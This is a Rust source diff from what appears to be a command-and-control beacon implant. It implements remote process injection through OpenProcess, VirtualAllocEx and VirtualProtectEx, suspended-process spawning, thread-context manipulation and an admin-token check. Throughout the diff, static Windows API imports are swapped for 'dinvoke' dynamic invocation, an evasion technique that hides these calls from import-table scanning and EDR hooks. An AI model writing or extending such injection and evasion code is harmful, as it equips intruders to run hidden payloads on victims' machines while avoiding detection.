@@ -14,17 +14,16 @@ use core::{
 use spin::Mutex;
 use windows::Win32::{
     Foundation::{CloseHandle, DuplicateHandle, HANDLE},
-    Security::{GetTokenInformation, RevertToSelf, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation},
+    Security::{RevertToSelf, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation},
     System::{
         Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext},
         Memory::{
             MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
-            UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect,
-            VirtualProtectEx, VirtualQuery,
+            UnmapViewOfFile, VirtualAlloc, VirtualFree, VirtualQuery,
         },
         Threading::{
-            CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessA, GetCurrentProcess, OpenProcess,
-            OpenThread, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
+            CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessA, GetCurrentProcess, OpenThread,
+            PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
         },
     },
 };
@@ -613,16 +612,16 @@ fn beacon_cleanup_process(info: *const PROCESS_INFORMATION) {
 
 /// Checks whether the current process is elevated (admin token).
 fn beacon_is_admin() -> u32 {
-    use windows::Win32::System::Threading::OpenProcessToken;
-
     let mut h_token = HANDLE::default();
 
     unsafe {
-        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token).is_ok() {
+        if dinvoke::advapi32::OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token)
+            .is_ok()
+        {
             let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
             let mut return_length = 0;
 
-            if GetTokenInformation(
+            if dinvoke::advapi32::GetTokenInformation(
                 h_token,
                 TokenElevation,
                 Some(&mut elevation as *mut _ as *mut c_void),
@@ -702,7 +701,7 @@ fn beacon_inject_process(
     }
 
     unsafe {
-        let h_process = match OpenProcess(
+        let h_process = match dinvoke::kernel32::OpenProcess(
             PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
             false,
             pid as u32,
@@ -711,7 +710,7 @@ fn beacon_inject_process(
             Err(_) => return,
         };
 
-        let remote_addr = VirtualAllocEx(
+        let remote_addr = dinvoke::kernel32::VirtualAllocEx(
             h_process,
             None,
             len as usize,
@@ -799,7 +798,7 @@ fn beacon_inject_temporary_process(
         }
 
         // Allocate memory in target process
-        let remote_addr = VirtualAllocEx(
+        let remote_addr = dinvoke::kernel32::VirtualAllocEx(
             h_process,
             None,
             len as usize,
@@ -1038,7 +1037,7 @@ fn beacon_virtual_alloc_ex(
 ) -> *mut c_void {
     use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
     unsafe {
-        VirtualAllocEx(
+        dinvoke::kernel32::VirtualAllocEx(
             process,
             Some(address),
             size,
@@ -1059,7 +1058,12 @@ fn beacon_virtual_protect(
     use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
     unsafe {
         let mut old = PAGE_PROTECTION_FLAGS(0);
-        let result = VirtualProtect(address, size, PAGE_PROTECTION_FLAGS(new_protect), &mut old);
+        let result = dinvoke::kernel32::VirtualProtect(
+            address,
+            size,
+            PAGE_PROTECTION_FLAGS(new_protect),
+            &mut old,
+        );
         if !old_protect.is_null() {
             *old_protect = old.0;
         }
@@ -1079,7 +1083,7 @@ fn beacon_virtual_protect_ex(
     use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
     unsafe {
         let mut old = PAGE_PROTECTION_FLAGS(0);
-        let result = VirtualProtectEx(
+        let result = dinvoke::kernel32::VirtualProtectEx(
             process,
             address,
             size,
@@ -1151,7 +1155,7 @@ fn beacon_resume_thread(thread: HANDLE) -> u32 {
 fn beacon_open_process(desired_access: u32, inherit_handle: i32, process_id: u32) -> HANDLE {
     use windows::Win32::System::Threading::PROCESS_ACCESS_RIGHTS;
     unsafe {
-        OpenProcess(
+        dinvoke::kernel32::OpenProcess(
             PROCESS_ACCESS_RIGHTS(desired_access),
             inherit_handle != 0,
             process_id,
